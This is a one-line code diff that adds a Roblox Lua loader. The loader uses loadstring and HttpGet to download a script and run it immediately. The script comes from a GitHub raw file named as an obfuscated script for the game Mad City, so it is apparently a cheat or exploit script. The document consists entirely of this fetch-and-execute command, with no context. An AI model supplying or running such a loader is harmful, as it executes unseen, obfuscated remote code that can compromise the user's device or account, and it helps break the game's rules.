@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/UWU/main/MaD%20CiTi/ObFusCatEd%20ScRiPt.lua"))()
